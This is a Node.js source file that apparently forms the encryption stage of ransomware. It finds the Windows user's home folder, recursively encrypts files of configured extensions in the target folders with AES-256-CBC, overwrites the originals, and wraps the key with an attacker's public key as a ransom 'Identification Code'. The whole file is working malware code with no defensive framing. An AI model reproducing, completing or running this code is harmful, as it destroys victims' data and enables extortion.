const os = require('os');
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');
const config = require('./config.json');

const encrypt = () => {

    const userName = os.userInfo().username;
    const userDir = `C:\\Users\\${userName}`;

    console.log('Starting...\n');

    // create key
    const key = createRandomString(32);
    const iv = crypto.randomBytes(16);

    console.log('Encrypted Files :');

    // encrypt files recursively
    for(let i = 0; i < config.targetFolder.length; i++) encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
    // for(let i = 0; i < config.targetFolder.length; i++) encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);

    console.log('\nEncryption Finished!\n');

    // create identification code
    const keyData = `${key}${iv.toString('hex')}`;
    const idCode = encryptPublicKey(keyData);

    console.log(`Identification Code : ${idCode}\n`);

};

const createRandomString = (length) => {

    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const charactersLength = characters.length;

    let result = '';
    for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * charactersLength));

    return result;

};

const encryptDir = (dir, key, iv) => {

    // if directory does not exist
    if(!fs.existsSync(dir)) return;

    fs.readdirSync(dir).forEach(file => {

        try {

            const fullPath = path.join(dir, file);

            if(fs.lstatSync(fullPath).isDirectory()) { // if folder

                // recursive call
                encryptDir(fullPath, key, iv);

            } else { // if file

                let isTarget = false;

                // check extension
                for(let j = 0; j < config.targetExtension.length; j++) {
                    if(fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
                        isTarget = true;
                        break;
                    }
                }

                if(isTarget) {

                    // check file size (only under 1GB)
                    let fileStat = fs.statSync(fullPath);
                    let fileSize = fileStat['size'];
                    if(fileSize < 1e9) {

                        encryptFile(fullPath, key, iv);

                        console.log(fullPath);

                    }

                }

            }

        } catch(error) {

            console.log(error);

        }

    });

};

const encryptFile = (file, key, iv) => {

    const fileData = fs.readFileSync(file).toString();
    const encryptedData = encryptAES(fileData, key, iv);

    fs.writeFileSync(file, encryptedData);

    console.log(file);

};


const encryptAES = (plainText, key, iv) => {

    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

    let encryptedText = cipher.update(plainText);
    encryptedText = Buffer.concat([encryptedText, cipher.final()]);

    return encryptedText.toString('base64');

};

const encryptPublicKey = (plainText) => {

    const plainBuffer = Buffer.from(plainText);
    const encryptedBuffer = crypto.publicEncrypt(config.publicKey, plainBuffer);

    return encryptedBuffer.toString('base64');

};

// execute
module.exports = encrypt;